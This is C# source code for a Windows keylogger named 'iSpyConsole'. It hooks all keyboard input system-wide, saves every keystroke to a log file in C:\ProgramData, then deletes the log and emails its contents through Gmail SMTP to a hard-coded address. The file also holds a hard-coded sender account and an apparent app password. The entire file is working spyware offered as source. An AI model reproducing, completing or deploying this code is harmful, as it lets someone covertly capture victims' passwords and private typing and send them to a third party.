using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Mail;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Diagnostics;
using System.IO;
using System.Reflection.Emit;
using System.Windows.Forms;

namespace iSpyConsole
{
    public class Spy
    {
        #region MS
        NetworkCredential login;
        SmtpClient client;
        MailMessage msg;
        #endregion

        #region
        private const int WPL = 13;
        private const int WPH = 0x0100;

        private LowLevelKeyboardProc WPPassed;
        private IntPtr WH = IntPtr.Zero;

        public delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("user32.dll", SetLastError = true)]

        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lfpn, IntPtr hfn, uint dwThreadId);
        [DllImport("user32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]

        private static extern bool UnhookWindowsHookEx(IntPtr hfn);
        [DllImport("user32.dll", SetLastError = true)]

        private static extern IntPtr CallNextHookEx(IntPtr hfn, int nCode, IntPtr wParam, IntPtr lParam);
        [DllImport("kernel32.dll", SetLastError = true)]

        private static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("user32.dll")]

        static extern bool GetKeyboardState(byte[] lpKeyState);
        [DllImport("user32.dll")]

        static extern uint MapVirtualKey(uint uCode, uint uMapType);
        [DllImport("user32.dll")]
        static extern IntPtr GetKeyboardLayout(uint idThread);
        [DllImport("user32.dll")]

        static extern int ToUnicodeEx(uint wVirtKey, uint wScanCode, byte[] lpKeyState, [Out, MarshalAs(UnmanagedType.LPWStr)] StringBuilder pwszBuff, int cchBuff, uint wFlags, IntPtr dwhkl);

        private string LOG_FILE_NAME = @"C:\ProgramData\mylog.txt";
        private string ARCHIVE_FILE_NAME = @"C:\ProgramData\mylog_archive.txt";
        private static string buffer = "";
        private const int MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG = 0;
        #endregion
        #region fnk
        public string KeyCodeToUnicode(Keys key)
        {
            byte[] keyboardState = new byte[255];
            bool keyboardStateStatus = GetKeyboardState(keyboardState);

            if (!keyboardStateStatus)
            {
                return "";
            }

            uint virtualKeyCode = (uint)key;
            uint scanCode = MapVirtualKey(virtualKeyCode, 0);
            IntPtr inputLocaleIdentifier = GetKeyboardLayout(0);

            StringBuilder result = new StringBuilder();
            ToUnicodeEx(virtualKeyCode, scanCode, keyboardState, result, (int)5, (uint)0, inputLocaleIdentifier);

            return result.ToString();
        }

        private IntPtr HookCallback1(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (buffer.Length >= MAX_KEYSTROKES_BEFORE_WRITING_TO_LOG)
            {
                StreamWriter output = new StreamWriter(LOG_FILE_NAME, true);
                output.Write(buffer);
                output.Close();
                buffer = "";
            }

            if (nCode >= 0 && wParam == (IntPtr)WPH)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string loggedKey = KeyCodeToUnicode((Keys)vkCode);
                buffer += loggedKey;

            }

            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using (ProcessModule module = Process.GetCurrentProcess().MainModule)
            {
                return SetWindowsHookEx(WPL, proc, GetModuleHandle(module.ModuleName), 0);
            }
        }
        #endregion

        public void Start(string path)
        {
            LOG_FILE_NAME = path + @"\mylog.txt";
            ARCHIVE_FILE_NAME = path+@"\mylog_archive.txt";
            Console.WriteLine("Logging");
            WPPassed += HookCallback1;
            WH = SetHook(WPPassed);
        }

        private void UnhookWindowsHook()
        {
            Console.WriteLine("Logging Stopped");
            UnhookWindowsHookEx(WH);
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        public void SendMail()
        {
            UnhookWindowsHook();
            Console.WriteLine("Email Initiated");
            FileInfo logFile = new FileInfo(LOG_FILE_NAME);

            if (logFile.Exists)
            {
                try
                {
                    // Copy the log file to the archive
                    logFile.CopyTo(ARCHIVE_FILE_NAME, true);

                    // Delete the log file
                    logFile.Delete();

                    // Email the archive and send email using a new thread
                    StreamReader input = new StreamReader(ARCHIVE_FILE_NAME);
                    string emailBody = input.ReadToEnd();
                    input.Close();

                    MailMessage message = new MailMessage();
                    SmtpClient smtp = new SmtpClient();
                    message.From = new MailAddress("isaskl4546@gmail.com");
                    message.To.Add(new MailAddress("ntupasstestingg2@gmail.com"));
                    message.Subject = "Test";
                    message.IsBodyHtml = true; //to make message body as html
                    message.Body = emailBody;
                    smtp.Port = 587;
                    smtp.Host = "smtp.gmail.com"; //for gmail host
                    smtp.EnableSsl = true;
                    smtp.UseDefaultCredentials = false;
                    smtp.Credentials = new NetworkCredential("isaskl4546@gmail.com", "ashrkkkihbgxpdcm");
                    smtp.DeliveryMethod = SmtpDeliveryMethod.Network;
                    smtp.Send(message);
                    Console.WriteLine("Your Email Has Send!");
                    Console.WriteLine("on Hold");
                }
                catch (Exception ex)
                {
                    Console.Out.WriteLine(ex.Message.ToString());
                }
            }
        }
    }
}
